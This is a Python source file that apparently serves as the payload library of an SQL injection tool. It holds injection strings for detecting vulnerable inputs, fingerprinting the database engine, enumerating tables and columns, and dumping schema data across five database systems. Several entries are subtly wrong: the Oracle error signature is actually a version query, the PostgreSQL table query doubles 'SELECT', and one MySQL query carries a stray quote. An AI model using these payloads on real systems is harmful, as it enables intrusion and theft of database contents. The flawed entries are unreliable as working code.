class Query:
    checks = {
        'error': ["'"],
        'boolean': ["1' AND 1=1 -- ", "1' AND 1=2 -- "],
        'union': ["' UNION SELECT NULL -- ", "' UNION SELECT NULL, NULL -- ", "' UNION SELECT NULL, NULL, NULL -- "],
    }

    errors = {
        'MySQL': "You have an error in your SQL syntax;",
        'Microsoft': "Unclosed quotation mark",
        'Oracle': "' UNION SELECT banner FROM v$version WHERE rownum = 1 -- ",
        'PostgreSQL': "ERROR: syntax error at",
        'SQLite': 'near "\'\": syntax error'
    }

    versions = {
        'MySQL': "' UNION SELECT @@version -- ",
        'Microsoft': "' UNION SELECT @@version -- ",
        'Oracle': "' UNION SELECT banner FROM v$version WHERE rownum = 1 -- ",
        'PostgreSQL': "' UNION SELECT version() -- ",
        'SQLite': "' UNION SELECT sqlite_version() -- "
    }

    tables = {
        'MySQL': "' UNION SELECT * FROM information_schema.tables -- ",
        'Microsoft': "' UNION SELECT * FROM information_schema.tables -- ",
        'Oracle': "' UNION SELECT * FROM all_tables -- ",
        'PostgreSQL': "' UNION SELECT SELECT * FROM information_schema.tables -- ",
        'SQLite': "' UNION SELECT name FROM sqlite_master WHERE type='table' -- "
    }

    columns = {
        'MySQL': "' UNION SELECT column_name, data_type FROM information_schema.columns ' -- ",
        'Microsoft': "' UNION SELECT column_name, data_type FROM information_schema.columns  -- ",
        'Oracle': "' UNION SELECT column_name FROM all_cons_columns  -- ",
        'PostgreSQL': "' UNION SELECT column_name FROM information_schema.columns  -- ",
        'SQLite': "' UNION SELECT sql FROM sqlite_master  -- " 
    }

    dump = {
        'MySQL': "' UNION SELECT GROUP_CONCAT(table_name,':',column_name SEPARATOR '|') FROM information_schema.columns--",
        'Microsoft': "' UNION SELECT STRING_AGG(table_name+':'+column_name, '|') FROM information_schema.columns--",
        'Oracle': "' UNION SELECT LISTAGG(table_name||':'||column_name, '|') WITHIN GROUP (ORDER BY table_name) FROM all_tab_columns--",
        'PostgreSQL': "' UNION SELECT STRING_AGG(table_name||':'||column_name, '|') FROM information_schema.columns--",
        'SQLite': "' UNION SELECT GROUP_CONCAT(tbl_name||':'||sql, '|') FROM sqlite_master WHERE type='table'--"
    }